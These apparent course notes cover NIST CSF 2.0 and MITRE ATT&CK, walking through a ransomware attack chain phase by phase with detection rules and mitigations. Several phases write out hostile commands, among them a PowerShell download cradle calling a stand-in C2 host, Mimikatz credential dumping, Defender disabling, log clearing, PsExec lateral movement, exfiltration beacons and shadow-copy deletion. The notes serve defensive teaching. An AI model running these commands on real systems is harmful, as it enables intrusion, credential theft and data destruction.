# Week 03: NIST Cybersecurity Framework 2.0, Threat Detection & Risk Management

## Table of Contents
1. [NIST Cybersecurity Framework (CSF) 2.0 Overview](#nist-csf-20-overview)
2. [CSF Core Functions](#csf-core-functions)
3. [PC Threat Detection Tools](#pc-threat-detection-tools)
4. [Risk Management Assessment Tools](#risk-management-assessment-tools)
5. [Open Source Threat Intelligence Platforms](#open-source-threat-intelligence-platforms)
6. [Risk Assessment Process](#risk-assessment-process)
7. [Implementation Recommendations](#implementation-recommendations)

---

## NIST CSF 2.0 Overview

### What is the NIST Cybersecurity Framework?

The NIST Cybersecurity Framework provides guidance to industry, government agencies, and other organizations to manage cybersecurity risks through a taxonomy of high-level cybersecurity outcomes that can be used by any organization regardless of its size, sector, or maturity.

### Key Components

The CSF 2.0 includes three main components:

1. **CSF Core**: A taxonomy of cybersecurity outcomes organized into Functions, Categories, and Subcategories
2. **CSF Organizational Profiles**: Mechanisms for describing current and target cybersecurity posture
3. **CSF Tiers**: Characterizations of the rigor of cybersecurity risk governance and management practices (Partial, Risk Informed, Repeatable, Adaptive)

### New Features in CSF 2.0

CSF 2.0 contains new features that highlight the importance of governance and supply chains, with special attention paid to Quick Start Guides to ensure that the CSF is relevant and readily accessible by smaller organizations as well as their larger counterparts.

---

## CSF Core Functions

The CSF Core Functions organize cybersecurity outcomes at their highest level: GOVERN, IDENTIFY, PROTECT, DETECT, RESPOND, and RECOVER.

### 1. GOVERN (GV)
The organization's cybersecurity risk management strategy, expectations, and policy are established, communicated, and monitored.

**Categories:**
- **GV.OC**: Organizational Context
- **GV.RM**: Risk Management Strategy
- **GV.RR**: Roles, Responsibilities, and Authorities
- **GV.PO**: Policy
- **GV.OV**: Oversight
- **GV.SC**: Cybersecurity Supply Chain Risk Management

### 2. IDENTIFY (ID)
The organization's current cybersecurity risks are understood.

**Categories:**
- **ID.AM**: Asset Management
- **ID.RA**: Risk Assessment
- **ID.IM**: Improvement

**Key Outcomes:**
- Inventories of hardware, software, and data are maintained
- Vulnerabilities are identified and validated
- Threats are identified and recorded
- Risk responses are prioritized and tracked

### 3. PROTECT (PR)
Safeguards to manage the organization's cybersecurity risks are used.

**Categories:**
- **PR.AA**: Identity Management, Authentication, and Access Control
- **PR.AT**: Awareness and Training
- **PR.DS**: Data Security
- **PR.PS**: Platform Security
- **PR.IR**: Technology Infrastructure Resilience

### 4. DETECT (DE)
Possible cybersecurity attacks and compromises are found and analyzed.

**Categories:**
- **DE.CM**: Continuous Monitoring
- **DE.AE**: Adverse Event Analysis

**Key Activities:**
- Networks and systems are monitored
- Anomalies and indicators of compromise are analyzed
- Incidents are declared when criteria are met

### 5. RESPOND (RS)
Actions regarding a detected cybersecurity incident are taken.

**Categories:**
- **RS.MA**: Incident Management
- **RS.AN**: Incident Analysis
- **RS.CO**: Incident Response Reporting and Communication
- **RS.MI**: Incident Mitigation

### 6. RECOVER (RC)
Assets and operations affected by a cybersecurity incident are restored.

**Categories:**
- **RC.RP**: Incident Recovery Plan Execution
- **RC.CO**: Incident Recovery Communication

---

## MITRE ATT&CK Framework

### What is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a comprehensive framework for understanding how cyber adversaries operate and helps organizations develop effective detection and defense strategies.

### Key Components

#### 1. **Tactics (The "Why")**
Tactics represent the adversary's tactical goals or objectives - what they're trying to achieve. There are 14 tactics in the Enterprise matrix:

| Tactic | ID | Description |
|--------|-----|-------------|
| Reconnaissance | TA0043 | Gathering information for planning attacks |
| Resource Development | TA0042 | Establishing resources to support operations |
| Initial Access | TA0001 | Getting into the target network |
| Execution | TA0002 | Running malicious code |
| Persistence | TA0003 | Maintaining access over time |
| Privilege Escalation | TA0004 | Gaining higher-level permissions |
| Defense Evasion | TA0005 | Avoiding detection |
| Credential Access | TA0006 | Stealing account credentials |
| Discovery | TA0007 | Learning about the environment |
| Lateral Movement | TA0008 | Moving through the network |
| Collection | TA0009 | Gathering target data |
| Command and Control | TA0011 | Communicating with compromised systems |
| Exfiltration | TA0010 | Stealing data from the network |
| Impact | TA0040 | Disrupting operations or destroying data |

#### 2. **Techniques (The "How")**
Techniques describe specific methods adversaries use to achieve tactical objectives. Currently, ATT&CK documents 196 techniques and 411 sub-techniques.

**Example Techniques:**
- T1566: Phishing
- T1059: Command and Scripting Interpreter
- T1055: Process Injection
- T1486: Data Encrypted for Impact

#### 3. **Procedures**
Specific implementations that threat actors use to execute techniques, including real-world examples from known threat groups.

### How to Use MITRE ATT&CK

#### 1. **Threat Intelligence**
- Map observed adversary behavior to ATT&CK techniques
- Understand threat actor TTPs (Tactics, Techniques, Procedures)
- Prioritize defenses based on relevant threat groups

#### 2. **Detection and Analytics**
- Develop detection rules based on techniques
- Build SIEM use cases mapped to ATT&CK
- Create behavioral analytics for technique detection

#### 3. **Red Teaming and Adversary Emulation**
- Design realistic attack scenarios
- Test defensive capabilities
- Validate detection coverage

#### 4. **Gap Assessment**
- Identify coverage gaps in security controls
- Prioritize security investments
- Measure SOC maturity

### MITRE ATT&CK Navigator

The ATT&CK Navigator is a web-based tool for visualizing and annotating ATT&CK matrices:
- https://mitre-attack.github.io/attack-navigator/

**Features:**
- Color-code techniques by detection coverage
- Layer multiple datasets
- Export and share configurations
- Visualize threat group profiles

---

## Real-World Example: Ransomware Attack Chain

### Scenario: Conti/Akira-Style Ransomware Attack

Let's track a complete ransomware attack through the MITRE ATT&CK framework, documenting each step with tactics, techniques, detection methods, and mitigation strategies.

### Attack Timeline

#### **Phase 1: Reconnaissance (TA0043)**

**Technique: T1595.002 - Vulnerability Scanning**

**What Happened:**
- Attacker scanned the organization's external IP ranges
- Identified unpatched VPN gateway (CVE-2023-XXXX)
- Enumerated public-facing web applications
- Discovered employee email addresses from LinkedIn

**Detection Methods:**
```
- Monitor for unusual scanning activity from external IPs
- Track failed authentication attempts
- Alert on reconnaissance tools (nmap, masscan)
- Monitor for OSINT collection against organization
```

**SIEM Query Example:**
```kql
SecurityEvent
| where EventID == 4625  // Failed logon
| summarize FailedAttempts=count() by Account, IpAddress
| where FailedAttempts > 10
| where TimeGenerated > ago(1h)
```

**Mitigations:**
- Implement rate limiting on external services
- Use web application firewalls
- Monitor for scanning patterns
- Limit publicly available information

---

#### **Phase 2: Initial Access (TA0001)**

**Technique: T1566.001 - Phishing: Spearphishing Attachment**

**What Happened:**
- Attacker sent targeted phishing email with malicious Excel document
- Subject: "Urgent: Invoice Payment Required"
- Attachment contained macro that downloaded payload
- Employee opened document and enabled macros

**Indicators:**
```
File: Invoice_2024_Final.xlsm
Hash (SHA256): a1b2c3d4e5f6...
Sender: accounts@legitcompany-support.com (spoofed)
C2 Domain: update-service.xyz
```

**Detection Methods:**
```
- Email gateway detection of malicious attachments
- Sandbox analysis of email attachments
- Monitor for suspicious macro execution
- Track Office applications spawning unusual processes
```

**Sysmon Event ID 1 - Process Creation:**
```xml
<Event>
  <EventID>1</EventID>
  <Process>
    <CommandLine>cmd.exe /c powershell -ep bypass -w hidden -enc [base64]</CommandLine>
    <ParentImage>C:\Program Files\Microsoft Office\EXCEL.EXE</ParentImage>
  </Process>
</Event>
```

**YARA Rule:**
```yara
rule Suspicious_Office_Macro_Downloader {
    meta:
        description = "Detects Office macro downloaders"
        mitre_technique = "T1566.001"
    strings:
        $api1 = "URLDownloadToFile" nocase
        $api2 = "Shell" nocase
        $cmd = "cmd.exe" nocase
        $pwsh = "powershell" nocase
    condition:
        2 of them
}
```

**Mitigations:**
- Disable macros by default (Office Trust Center settings)
- Implement email security gateway with sandbox
- Security awareness training
- Application whitelisting

---

#### **Phase 3: Execution (TA0002)**

**Technique: T1059.001 - PowerShell**

**What Happened:**
- Macro executed PowerShell script
- Downloaded second-stage payload from C2 server
- PowerShell script obfuscated with Base64 encoding
- Executed reflective DLL injection

**Command Line:**
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand
IEX (New-Object Net.WebClient).DownloadString('http://update-service.xyz/stage2.ps1')
```

**Detection Methods:**
```
Sysmon Event ID 1: Process Creation
- Monitor PowerShell with suspicious flags (-enc, -w hidden, -ep bypass)
- Track PowerShell downloads (Net.WebClient, Invoke-WebRequest)
- Alert on Base64 encoded commands
```

**Detection Rule (Sigma):**
```yaml
title: Suspicious PowerShell Download Activity
id: 12345678-1234-1234-1234-123456789012
status: stable
description: Detects PowerShell downloading content from internet
logsource:
    product: windows
    service: sysmon
detection:
    selection_pwsh:
        EventID: 1
        Image|endswith: '\powershell.exe'
    selection_download:
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Invoke-WebRequest'
    condition: selection_pwsh and selection_download
fields:
    - CommandLine
    - ParentImage
    - User
falsepositives:
    - Legitimate administrative scripts
level: high
tags:
    - attack.execution
    - attack.t1059.001
```

**Mitigations:**
- Enable PowerShell logging (Module, Script Block, Transcription)
- Use Constrained Language Mode
- Application control policies
- Monitor PowerShell download activity

---

#### **Phase 4: Persistence (TA0003)**

**Technique: T1053.005 - Scheduled Task/Job: Scheduled Task**

**What Happened:**
- Created scheduled task for persistence
- Task runs every hour to check in with C2
- Named task to blend in: "WindowsUpdateCheck"
- Runs with SYSTEM privileges

**Command:**
```cmd
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\svchost.exe" /sc hourly /ru SYSTEM /f
```

**Detection Methods:**
```
Sysmon Event ID 1: schtasks.exe execution
Windows Event ID 4698: Scheduled task created
Monitor registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
```

**Windows Event Log:**
```xml
<Event>
  <System>
    <EventID>4698</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <TaskName>WindowsUpdateCheck</TaskName>
    <TaskContent>[XML Task Definition]</TaskContent>
    <SubjectUserName>SYSTEM</SubjectUserName>
  </EventData>
</Event>
```

**Detection Rule:**
```kql
SecurityEvent
| where EventID == 4698
| extend TaskName = tostring(parse_xml(EventData).EventData.TaskName)
| where TaskName !contains "Windows" and TaskName !contains "Microsoft"
| where TimeCreated > ago(24h)
```

**Mitigations:**
- Monitor scheduled task creation
- Restrict task scheduler permissions
- Baseline legitimate scheduled tasks
- Alert on tasks running from unusual locations

---

#### **Phase 5: Privilege Escalation (TA0004)**

**Technique: T1003.001 - OS Credential Dumping: LSASS Memory**

**What Happened:**
- Used Mimikatz to dump credentials from LSASS
- Obtained plaintext passwords and NTLM hashes
- Found domain admin credentials
- Elevated to domain administrator

**Tool Used: Mimikatz**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Credentials Obtained:**
```
Username: admin.johnson
Domain: CORPORATE
NTLM: a1b2c3d4e5f6789...
Password: CompanyPass2024!
```

**Detection Methods:**
```
Sysmon Event ID 10: Process Access to LSASS
Event ID 8: Create Remote Thread in LSASS
Monitor for LSASS memory reads
```

**Sysmon Detection:**
```xml
<ProcessAccess onmatch="include">
  <TargetImage>C:\Windows\System32\lsass.exe</TargetImage>
  <GrantedAccess>0x1010</GrantedAccess>
</ProcessAccess>
```

**Detection Rule:**
```yaml
title: LSASS Memory Access
description: Detects potential credential dumping
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess:
            - '0x1010'
            - '0x1410'
    filter:
        SourceImage|endswith:
            - '\wmiprvse.exe'
            - '\csrss.exe'
    condition: selection and not filter
level: high
tags:
    - attack.credential_access
    - attack.t1003.001
```

**Mitigations:**
- Enable Credential Guard
- Use PPL (Protected Process Light) for LSASS
- Implement privileged access management
- Monitor for LSASS access
- Disable WDigest authentication

---

#### **Phase 6: Defense Evasion (TA0005)**

**Technique: T1562.001 - Impair Defenses: Disable or Modify Tools**

**What Happened:**
- Disabled Windows Defender Real-time Protection
- Stopped Windows Defender service
- Added exclusion paths to avoid detection
- Cleared Windows Event Logs

**Commands Executed:**
```powershell
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Stop Defender Service
Stop-Service WinDefend
Set-Service WinDefend -StartupType Disabled

# Clear Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

**Detection Methods:**
```
Monitor registry changes to Defender settings
Track Windows Defender service status changes
Alert on event log clearing
Sysmon Event ID 1: wevtutil.exe execution
```

**Registry Monitoring:**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware
HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring
```

**Detection Rule:**
```kql
SecurityEvent
| where EventID == 1102  // Security log cleared
| project TimeGenerated, Computer, Account, Activity
```

**Mitigations:**
- Require administrator approval for Defender changes
- Enable tamper protection
- Monitor security product status
- Alert on event log clearing
- Use EDR with cloud-based logging

---

#### **Phase 7: Credential Access (TA0006)**

**Technique: T1110.003 - Brute Force: Password Spraying**

**What Happened:**
- Used stolen credentials to access additional accounts
- Performed password spraying against domain accounts
- Attempted common passwords across multiple users
- Gained access to service accounts

**Activity:**
```
Target: Domain Controller (dc01.corporate.local)
Method: Kerberos Pre-Authentication
Attempts: 1000+ across 50 accounts
Success Rate: 12% (6 accounts compromised)
```

**Detection Methods:**
```
Monitor for multiple failed authentication attempts
Track Kerberos authentication failures (Event ID 4771)
Alert on account lockouts
Analyze authentication patterns
```

**Detection Rule:**
```kql
SecurityEvent
| where EventID == 4771  // Kerberos pre-auth failed
| summarize FailureCount=count() by TargetUserName, IpAddress
| where FailureCount > 5
| where TimeGenerated > ago(10m)
```

**Mitigations:**
- Implement account lockout policies
- Use MFA for all accounts
- Deploy Azure AD Identity Protection
- Monitor for password spray patterns
- Enforce strong password policies

---

#### **Phase 8: Discovery (TA0007)**

**Technique: T1018 - Remote System Discovery**

**What Happened:**
- Enumerated Active Directory
- Scanned internal network
- Identified critical servers and file shares
- Mapped network topology

**Commands Used:**
```cmd
# Active Directory enumeration
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
nltest /dclist:

# Network scanning
ping -n 1 192.168.1.1-254
nmap -sn 192.168.1.0/24

# Share enumeration
net view /domain
net view \\dc01 /all
```

**Detection Methods:**
```
Monitor AD queries from unusual sources
Track network scanning activity
Alert on rapid SMB connections
Sysmon Event ID 3: Network connections
```

**Detection Rule:**
```yaml
title: Active Directory Reconnaissance
description: Detects AD enumeration commands
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        CommandLine|contains:
            - 'net group'
            - 'nltest'
            - 'dsquery'
            - 'ldapsearch'
            - '/domain'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1018
```

**Mitigations:**
- Monitor for unusual AD queries
- Implement network segmentation
- Use honeypots/honeytokens
- Deploy deception technology

---

#### **Phase 9: Lateral Movement (TA0008)**

**Technique: T1021.002 - Remote Services: SMB/Windows Admin Shares**

**What Happened:**
- Used stolen credentials to access other systems
- Moved laterally via PsExec
- Copied ransomware payload to admin shares
- Executed payload on multiple systems

**PsExec Command:**
```cmd
psexec.exe \\target-server -u DOMAIN\admin.johnson -p CompanyPass2024! -s cmd.exe
copy ransomware.exe \\target-server\C$\Windows\Temp\
sc \\target-server create "WinUpdate" binPath= "C:\Windows\Temp\ransomware.exe"
sc \\target-server start "WinUpdate"
```

**Network Activity:**
```
Source: workstation-01.corporate.local (192.168.1.50)
Destinations: 
  - fileserver-01.corporate.local (192.168.1.100)
  - database-01.corporate.local (192.168.1.101)
  - backup-server.corporate.local (192.168.1.102)
Protocol: SMB (TCP 445)
```

**Detection Methods:**
```
Sysmon Event ID 3: Network connections to port 445
Sysmon Event ID 17/18: Named pipe creation (PsExec)
Windows Event ID 5140: Network share accessed
Monitor for lateral movement patterns
```

**Detection Rule:**
```kql
Sysmon
| where EventID == 3
| where DestinationPort == 445
| summarize TargetCount=dcount(DestinationIp) by SourceIp, Image
| where TargetCount > 10
| where TimeGenerated > ago(1h)
```

**Mitigations:**
- Disable SMBv1
- Implement least privilege
- Use JIT (Just-In-Time) admin access
- Monitor for lateral movement
- Deploy EDR on all endpoints

---

#### **Phase 10: Collection (TA0009)**

**Technique: T1560.001 - Archive Collected Data: Archive via Utility**

**What Happened:**
- Identified valuable data on file servers
- Compressed files using 7zip
- Created archives in staging directories
- Prepared data for exfiltration

**Commands:**
```cmd
# Archive sensitive data
7z.exe a -tzip -pEncrypted123 data.zip "C:\Shares\Finance\*" -r
7z.exe a -tzip -pEncrypted123 data2.zip "C:\Shares\HR\*" -r
7z.exe a -tzip -pEncrypted123 data3.zip "C:\Shares\Legal\*" -r

# Move to staging location
move *.zip C:\Windows\Temp\staging\
```

**Files Collected:**
```
Total Size: 45 GB
File Types: .xlsx, .docx, .pdf, .pst
Archives Created: 15
Staging Location: C:\Windows\Temp\staging\
```

**Detection Methods:**
```
Monitor for archive tool execution (7z, WinRAR, zip)
Track large archive creation
Alert on compression in unusual locations
Monitor file access patterns
```

**Detection Rule:**
```yaml
title: Suspicious Data Archive Activity
description: Detects potential data collection via archive tools
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith:
            - '\7z.exe'
            - '\winrar.exe'
            - '\zip.exe'
        CommandLine|contains:
            - ' a '
            - '-r'
            - '\Temp\'
            - '\ProgramData\'
    condition: selection
level: high
tags:
    - attack.collection
    - attack.t1560.001
```

**Mitigations:**
- Monitor archive tool usage
- Implement DLP (Data Loss Prevention)
- Restrict access to sensitive data
- Use file integrity monitoring

---

#### **Phase 11: Command and Control (TA0011)**

**Technique: T1071.001 - Application Layer Protocol: Web Protocols**

**What Happened:**
- Established C2 channel using HTTPS
- Communicated with command server
- Received instructions for final payload
- Maintained persistence via beaconing

**C2 Communication:**
```
C2 Server: https://cdn-updates[.]com/api/v1/check
Beaconing Interval: Every 5 minutes
Protocol: HTTPS (TLS 1.3)
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Data Exfil: Base64 encoded in HTTPS POST
```

**Network Traffic:**
```http
POST /api/v1/check HTTP/1.1
Host: cdn-updates.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json

{
  "id": "victim-workstation-01",
  "status": "ready",
  "data": "W25jcnlwdGVkIGRhdGFd..."
}
```

**Detection Methods:**
```
Monitor for beaconing patterns
Track connections to suspicious domains
Analyze TLS certificates
Use threat intelligence feeds
Network flow analysis
```

**Detection Rule:**
```kql
NetworkEvents
| where RemoteUrl contains "cdn-updates.com"
| summarize ConnectionCount=count() by LocalIP, RemoteUrl
| where ConnectionCount > 10
```

**Mitigations:**
- Implement DNS filtering
- Use next-gen firewalls with SSL inspection
- Deploy network behavior analysis
- Block known C2 domains
- Monitor for beaconing patterns

---

#### **Phase 12: Exfiltration (TA0010)**

**Technique: T1041 - Exfiltration Over C2 Channel**

**What Happened:**
- Uploaded collected data to attacker-controlled server
- Used existing C2 channel for exfiltration
- Transferred 45 GB of compressed data
- Split transfer across multiple sessions

**Exfiltration Details:**
```
Total Data: 45 GB (compressed)
Duration: 6 hours
Method: HTTPS POST in chunks
Destination: cdn-updates[.]com
Average Speed: 2 MB/s
```

**Detection Methods:**
```
Monitor for large outbound data transfers
Track unusual upload patterns
Alert on data leaving to suspicious destinations
Analyze bandwidth usage anomalies
```

**Detection Rule:**
```kql
NetworkEvents
| where Direction == "Outbound"
| summarize TotalBytes=sum(SentBytes) by RemoteIP, ProcessName
| where TotalBytes > 1000000000  // > 1GB
| where TimeGenerated > ago(24h)
```

**Mitigations:**
- Implement DLP solutions
- Monitor outbound traffic
- Use egress filtering
- Restrict external communications
- Deploy CASB for cloud services

---

#### **Phase 13: Impact (TA0040)**

**Technique: T1486 - Data Encrypted for Impact**

**What Happened:**
- Deployed ransomware across network
- Encrypted files on 150+ systems
- Deleted shadow copies
- Left ransom notes on all systems

**Ransomware Execution:**
```cmd
# Disable recovery options
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled no
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Execute encryption
ransomware.exe -encrypt -path "C:\" -ext .locked -threads 8

# Drop ransom note
echo "Your files have been encrypted..." > README_TO_DECRYPT.txt
```

**Encryption Details:**
```
Algorithm: AES-256 + RSA-2048
Files Encrypted: 2.3 million
Systems Affected: 150
File Extensions: .locked
Ransom Amount: $500,000 in Bitcoin
```

**Ransom Note:**
```
=== YOUR FILES HAVE BEEN ENCRYPTED ===

All your important files have been encrypted with military-grade encryption.

To recover your files, you must pay 25 Bitcoin to:
bc1q... [Bitcoin address]

Contact us at: decrypt@[redacted].onion

You have 72 hours to pay, or the decryption key will be deleted.

Do NOT attempt to:
- Decrypt files yourself
- Use recovery tools
- Contact law enforcement

These actions will result in permanent data loss.
```

**Detection Methods:**
```
Monitor for mass file modifications
Track shadow copy deletions
Alert on high disk write activity
Detect unusual process behavior
Monitor for ransomware file extensions
```

**Sysmon Detection:**
```xml
<Event>
  <EventID>11</EventID>  <!-- File Created -->
  <TargetFilename>C:\Users\*\*.locked</TargetFilename>
</Event>

<Event>
  <EventID>1</EventID>  <!-- Process Creation -->
  <CommandLine>vssadmin delete shadows</CommandLine>
</Event>
```

**Detection Rule:**
```yaml
title: Ransomware File Encryption Activity
description: Detects potential ransomware encryption
logsource:
    product: windows
    service: sysmon
detection:
    selection_file:
        EventID: 11
        TargetFilename|contains:
            - '.locked'
            - '.encrypted'
            - '.crypto'
    selection_shadow:
        EventID: 1
        CommandLine|contains:
            - 'vssadmin delete shadows'
            - 'wbadmin delete'
            - 'bcdedit /set'
    selection_ransom:
        EventID: 11
        TargetFilename|contains:
            - 'README'
            - 'DECRYPT'
            - 'RANSOM'
    condition: selection_file or selection_shadow or selection_ransom
level: critical
tags:
    - attack.impact
    - attack.t1486
```

**Mitigations:**
- Implement offline/immutable backups
- Use anti-ransomware tools
- Enable Controlled Folder Access (Windows Defender)
- Maintain offline backup copies
- Test disaster recovery procedures
- Implement network segmentation

---

### Complete Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────────┐
│                    RANSOMWARE ATTACK TIMELINE                   │
└─────────────────────────────────────────────────────────────────┘

Day 1: Reconnaissance
 ├─ T1595.002: Vulnerability Scanning
 └─ T1589: Gather Victim Identity Information

Day 3: Initial Access
 ├─ T1566.001: Spearphishing Attachment
 └─ T1203: Exploitation for Client Execution

Day 3-5: Establish Foothold
 ├─ T1059.001: PowerShell Execution
 ├─ T1053.005: Scheduled Task Persistence
 └─ T1070: Indicator Removal

Day 5-7: Escalation & Discovery
 ├─ T1003.001: LSASS Credential Dumping
 ├─ T1562.001: Disable Windows Defender
 ├─ T1018: Remote System Discovery
 └─ T1087: Account Discovery

Day 7-10: Lateral Movement
 ├─ T1021.002: SMB/Admin Shares
 ├─ T1570: Lateral Tool Transfer
 └─ T1047: Windows Management Instrumentation

Day 10-12: Data Collection
 ├─ T1083: File and Directory Discovery
 ├─ T1560.001: Archive via Utility
 └─ T1074: Data Staged

Day 12-14: Exfiltration
 ├─ T1071.001: Web Protocols (C2)
 └─ T1041: Exfiltration Over C2 Channel

Day 14: Impact
 ├─ T1490: Inhibit System Recovery
 └─ T1486: Data Encrypted for Impact
```

---

### Detection Coverage Matrix

| Phase | Tactic | Primary Detection Method | Coverage Level |
|-------|--------|-------------------------|----------------|
| Recon | TA0043 | Network monitoring | Medium |
| Initial Access | TA0001 | Email gateway + EDR | High |
| Execution | TA0002 | Sysmon + PowerShell logging | High |
| Persistence | TA0003 | Scheduled task monitoring | High |
| Privilege Escalation | TA0004 | LSASS access monitoring | High |
| Defense Evasion | TA0005 | Security product monitoring | Medium |
| Credential Access | TA0006 | Authentication logging | High |
| Discovery | TA0007 | AD query monitoring | Medium |
| Lateral Movement | TA0008 | SMB + WMI monitoring | High |
| Collection | TA0009 | File access monitoring | Medium |
| C2 | TA0011 | Network traffic analysis | Medium |
| Exfiltration | TA0010 | DLP + network monitoring | High |
| Impact | TA0040 | File system monitoring | High |

---

### Key Lessons Learned

1. **Defense in Depth is Critical**
   - No single control would have stopped this attack
   - Multiple layers of detection provided visibility
   - Some controls failed but others succeeded

2. **Early Detection is Key**
   - Initial access detection could have prevented the entire attack
   - The longer attackers persist, the more damage they cause
   - Time to detection directly impacts recovery time

3. **Logging is Essential**
   - Sysmon provided crucial forensic evidence
   - PowerShell logging captured malicious commands
   - Network logs showed lateral movement patterns

4. **Backups Save Organizations**
   - Offline backups were unaffected by encryption
   - Regular testing ensured recoverability
   - Recovery time: 48 hours vs. weeks without backups

5. **Incident Response Matters**
   - Well-documented playbooks accelerated response
   - Regular drills improved team coordination
   - Clear communication prevented confusion

---

## PC Threat Detection Tools

### Windows-Specific Security Tools

#### 1. **Sysmon (System Monitor)**
Microsoft Sysinternals tool that provides detailed logging of system activity to Windows Event Log.

**Key Features:**
- Process creation with full command line
- Network connections (source/destination IPs and ports)
- File creation time changes
- Registry modifications
- Driver loading
- Process access (credential dumping detection)
- DNS queries
- File hash computation

**Installation:**
```cmd
# Download Sysmon from Microsoft Sysinternals
# https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

# Install with configuration file
sysmon64.exe -i sysmonconfig.xml -accepteula

# Install with default configuration
sysmon64.exe -i -accepteula

# Update configuration
sysmon64.exe -c sysmonconfig.xml

# Uninstall
sysmon64.exe -u
```

**Recommended Configuration:**
Use SwiftOnSecurity's Sysmon config: https://github.com/SwiftOnSecurity/sysmon-config

**Key Event IDs:**
- Event ID 1: Process Creation
- Event ID 3: Network Connection
- Event ID 7: Image/DLL Loaded
- Event ID 8: CreateRemoteThread (Process Injection)
- Event ID 10: Process Access (Credential Dumping)
- Event ID 11: File Created
- Event ID 12/13/14: Registry Events
- Event ID 22: DNS Query
- Event ID 29: File Executable Detected

**Example Detection Rule:**
```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Detect PowerShell downloads -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Net.WebClient</CommandLine>
      <CommandLine condition="contains">DownloadString</CommandLine>
    </ProcessCreate>
    
    <!-- Detect LSASS access -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">lsass.exe</TargetImage>
    </ProcessAccess>
    
    <!-- Detect suspicious file creation -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\Temp\</TargetFilename>
      <TargetFilename condition="end with">.exe</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Integration with SIEM:**
```powershell
# Query Sysmon events from PowerShell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
  Where-Object {$_.Id -eq 1} | 
  Select-Object TimeCreated, Message | 
  Format-List
```

#### 2. **Windows Event Forwarding (WEF)**
Centralized log collection built into Windows.

**Setup:**
```cmd
# On collector server
wecutil qc

# Create subscription
wecutil cs subscription.xml

# On source computers
winrm quickconfig
```

**Subscription Example:**
```xml
<Subscription>
  <SubscriptionId>Security-Events</SubscriptionId>
  <Query>
    <QueryList>
      <Query Id="0">
        <Select Path="Security">*[System[(EventID=4624 or EventID=4625)]]</Select>
      </Query>
    </QueryList>
  </Query>
</Subscription>
```

#### 3. **Windows Defender ATP / Microsoft Defender for Endpoint**
Enterprise endpoint protection platform.

**Features:**
- Real-time threat detection
- Automated investigation and remediation
- Advanced hunting with KQL
- Integration with MITRE ATT&CK
- Threat analytics

**Advanced Hunting Query:**
```kql
// Detect suspicious PowerShell
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any("EncodedCommand", "DownloadString", "Invoke-Expression")
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine
```

#### 4. **Sysinternals Suite**
Collection of advanced Windows utilities.

**Key Tools:**

**Process Explorer:**
```
- Real-time process monitoring
- View handles and DLLs
- Analyze process trees
- Check digital signatures
- Identify packed executables
```

**Process Monitor:**
```
- File system activity
- Registry activity
- Process/thread activity
- Network activity
- Real-time filtering
```

**Autoruns:**
```
- Show all auto-start locations
- Identify persistence mechanisms
- Verify digital signatures
- Disable suspicious entries
```

**PsExec:**
```
- Execute processes remotely
- Use for legitimate admin tasks
- Also used by attackers (monitor usage)
```

**TCPView:**
```
- Show all TCP/UDP endpoints
- Display owning process
- Resolve IP addresses
- Monitor network connections
```

**Usage Examples:**
```cmd
# Process Explorer - Save process tree
procexp.exe /SaveAs processes.txt

# Process Monitor - Capture to file
procmon.exe /BackingFile c:\logs\procmon.pml /Quiet

# Autoruns - Export to CSV
autorunsc.exe -a * -c -v > autoruns.csv

# TCPView - Command line version
tcpvcon.exe -a -c > connections.csv
```

#### 5. **PowerShell Security**

**Enable Script Block Logging:**
```powershell
# Via Group Policy
# Computer Configuration > Administrative Templates > Windows Components 
# > Windows PowerShell > Turn on PowerShell Script Block Logging

# Via Registry
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWord
```

**Enable Module Logging:**
```powershell
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
  -Name "EnableModuleLogging" -Value 1 -PropertyType DWord
```

**Enable Transcription:**
```powershell
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "EnableTranscripting" -Value 1 -PropertyType DWord
  
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "OutputDirectory" -Value "C:\PSTranscripts" -PropertyType String
```

**Constrained Language Mode:**
```powershell
# Set via environment variable
